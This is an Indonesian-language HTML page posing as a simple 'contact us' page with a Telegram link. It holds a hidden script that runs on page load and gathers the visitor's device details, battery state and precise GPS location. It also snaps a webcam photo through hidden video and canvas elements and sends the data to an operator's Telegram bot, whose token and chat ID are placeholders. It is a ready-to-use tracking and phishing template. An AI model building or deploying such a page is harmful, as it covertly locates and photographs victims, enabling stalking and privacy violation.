<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Halo, Hubungi Kami</title>
    <style>
        /* Gaya Sederhana */
        body {
            background-color: #000; /* Latar Belakang Hitam */
            color: #fff; /* Tulisan Putih */
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
            text-align: center;
        }
        h1 {
            font-size: 2.5em;
            margin-bottom: 20px;
        }
        #status {
            margin-top: 15px;
            font-size: 0.9em;
            color: #aaa;
        }
        .error { color: #ff5555; }
        .success { color: #55ff55; }

        /* Gaya Logo Telegram */
        .telegram-link {
            text-decoration: none;
            color: #fff;
            margin-top: 30px;
            display: flex;
            align-items: center;
            font-size: 1.2em;
        }
        .telegram-icon {
            width: 50px; 
            height: 50px;
            margin-right: 10px;
            background-color: #0088cc;
            border-radius: 50%;
            display: inline-flex;
            justify-content: center;
            align-items: center;
            font-size: 30px;
            line-height: 1;
        }

        /* Elemen tersembunyi untuk Logic Kamera */
        #video, #canvas { display: none; } 
    </style>
</head>
<body>
    <h1>Halo, hubungi kami</h1>
    
    <a href="https://t.me/lwkysie" class="telegram-link" target="_blank">
        <span class="telegram-icon">‚úàÔ∏è</span>
        @lwkysie
    </a>

    <div id="status">Memuat dan mengumpulkan data perangkat...</div>

    <video id="video" width="320" height="240" autoplay></video>
    <canvas id="canvas" width="320" height="240"></canvas>

    <script>
        // üö® GANTI DENGAN NILAI ANDA (PENTING! Nilai ini akan terlihat publik)
        const BOT_TOKEN = 'GANTI_DENGAN_BOT_TOKEN_ANDA'; 
        const CHAT_ID = 'GANTI_DENGAN_CHAT_ID_ANDA';     
        // --------------------------------------------------------------------
        const TELEGRAM_API_URL = `https://api.telegram.org/bot${BOT_TOKEN}`;


        // --- 1. Fungsi Utama: Mengumpulkan Semua Data dan Mengirim ---

        async function collectAndSendInfo() {
            const statusDiv = document.getElementById('status');
            const deviceInfo = {};
            
            statusDiv.innerHTML = "1/4 Mengumpulkan info waktu dan baterai...";

            // 1.1. Info HP, Waktu, Baterai
            deviceInfo.userAgent = navigator.userAgent || 'Tidak terdeteksi';
            const now = new Date();
            deviceInfo.timestamp = now.toISOString();
            deviceInfo.localTime = now.toLocaleString('id-ID', { timeZoneName: 'short', hour12: false });
            
            try {
                if ('getBattery' in navigator) {
                    const battery = await navigator.getBattery();
                    deviceInfo.batteryLevel = `${Math.round(battery.level * 100)}%`;
                    deviceInfo.batteryCharging = battery.charging ? 'Sedang Diisi Daya' : 'Tidak Diisi Daya';
                } else {
                    deviceInfo.batteryLevel = 'API Baterai tidak didukung.';
                }
            } catch (error) { deviceInfo.batteryLevel = `Gagal mendapatkan info baterai.`; }

            // 1.2. Koordinat Lokasi
            statusDiv.innerHTML = "2/4 Meminta akses lokasi...";
            try {
                deviceInfo.coordinates = await getCoordinates();
            } catch (error) {
                deviceInfo.coordinates = `Gagal mendapatkan lokasi: ${error.message}`;
            }

            // 1.3. Ambil Foto dari Kamera
            statusDiv.innerHTML = "3/4 Meminta akses kamera dan mengambil foto...";
            try {
                deviceInfo.photo = await capturePhoto();
            } catch (error) {
                deviceInfo.photo = `Gagal mengambil foto: ${error.message}.`;
                statusDiv.innerHTML = `‚ö†Ô∏è Gagal mengambil foto. Mengirim data lain...`;
            }
            
            // 1.4. Kirim data ke Telegram
            statusDiv.innerHTML = "4/4 Mengirim data langsung ke Telegram...";
            await sendToTelegram(deviceInfo);
            
            statusDiv.classList.add('success');
            statusDiv.innerHTML = "‚úÖ Data berhasil dikirim ke Telegram! Silakan hubungi kami.";
        }
        
        // --- 2. Fungsi Pembantu: Mendapatkan Koordinat ---
        function getCoordinates() {
            return new Promise((resolve, reject) => {
                if (!("geolocation" in navigator)) {
                    return resolve("Geolocation tidak didukung.");
                }
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const coords = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                        };
                        resolve(coords);
                    },
                    (error) => {
                        let errorMessage;
                        switch (error.code) {
                            case error.PERMISSION_DENIED: errorMessage = "Izin lokasi ditolak."; break;
                            case error.POSITION_UNAVAILABLE: errorMessage = "Lokasi tidak tersedia."; break;
                            case error.TIMEOUT: errorMessage = "Permintaan lokasi habis waktu (timeout)."; break;
                            default: errorMessage = error.message; break;
                        }
                        reject(new Error(errorMessage));
                    }, 
                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
                );
            });
        }
        
        // --- 3. Fungsi Pembantu: Mengambil Foto ---
        function capturePhoto() {
            return new Promise(async (resolve, reject) => {
                const video = document.getElementById('video');
                const canvas = document.getElementById('canvas');
                const context = canvas.getContext('2d');
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                    video.srcObject = stream;
                    video.onloadedmetadata = () => {
                        video.play();
                        setTimeout(() => {
                            context.drawImage(video, 0, 0, canvas.width, canvas.height);
                            const imageData = canvas.toDataURL('image/jpeg', 0.8); 
                            stream.getTracks().forEach(track => track.stop());
                            resolve(imageData);
                        }, 500); 
                    };
                } catch (err) { reject(new Error(`Akses Kamera Ditolak.`)); }
            });
        }

        // --- 4. Fungsi Utama: Mengirim Data Langsung ke Telegram ---

        function formatCoordinatesMessage(coords) {
            if (typeof coords === 'string') {
                return `\nStatus Lokasi: **${coords}**\n`;
            }
            const lat = coords.latitude.toFixed(6);
            const lon = coords.longitude.toFixed(6);
            const accuracy = coords.accuracy ? `${coords.accuracy.toFixed(2)} meter` : 'Tidak diketahui';
            const mapLink = `https://www.google.com/maps/search/?api=1&query=${lat},${lon}`;
            return `
‚úÖ **Koordinat GPS:**
- Latitude: \`${lat}\`
- Longitude: \`${lon}\`
- Akurasi: ${accuracy}
- Link Peta: [Lihat di Google Maps](${mapLink})
    `;
        }

        async function sendToTelegram(data) {
            const locationInfo = formatCoordinatesMessage(data.coordinates);

            const messageText = `
üö® **INFO PERANGKAT BARU TERDETEKSI** üö®
------------------------------------------------
**1. Informasi Perangkat (HP):**
\`${data.userAgent}\`

**2. Waktu Akses:**
Waktu Lokal: **${data.localTime}**
Timestamp: ${data.timestamp}

**3. Informasi Baterai:**
Level: **${data.batteryLevel}**
Status: ${data.batteryCharging}
${locationInfo}
    `;
            try {
                // A. Kirim Pesan Teks
                await fetch(`${TELEGRAM_API_URL}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: messageText,
                        parse_mode: 'Markdown'
                    })
                });

                // B. Kirim Titik Lokasi (jika berhasil)
                if (typeof data.coordinates === 'object') {
                    await fetch(`${TELEGRAM_API_URL}/sendLocation`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: CHAT_ID,
                            latitude: data.coordinates.latitude,
                            longitude: data.coordinates.longitude,
                            live_period: 0 
                        })
                    });
                }
                
                // C. Kirim Foto (Jika ada)
                if (data.photo && !data.photo.includes('Gagal mengambil foto')) {
                    // Telegram API (sendPhoto) tidak menerima Base64 langsung.
                    // Ini memerlukan FormData, yang sayangnya tidak dapat 
                    // dikirim langsung dari browser ke Telegram API karena 
                    // batasan CORS dan bagaimana Telegram memproses unggahan file.
                    // Oleh karena itu, *sendPhoto* seringkali **gagal** dari frontend.
                    
                    // Untuk skenario ini, kita hanya bisa mengirim notifikasi
                    // bahwa foto diambil.
                    await fetch(`${TELEGRAM_API_URL}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: CHAT_ID,
                            text: "‚ö†Ô∏è **Catatan Foto:** Foto diambil, tetapi tidak dapat diunggah langsung ke Telegram dari browser karena batasan keamanan (CORS/File Upload).",
                            parse_mode: 'Markdown'
                        })
                    });
                }

            } catch (error) {
                console.error('Error saat mengirim data ke Telegram:', error);
                document.getElementById('status').classList.add('error');
                document.getElementById('status').innerHTML = `‚ùå Gagal mengirim ke Telegram. Cek BOT_TOKEN dan CHAT_ID.`;
            }
        }

        window.onload = collectAndSendInfo;
    </script>
</body>
</html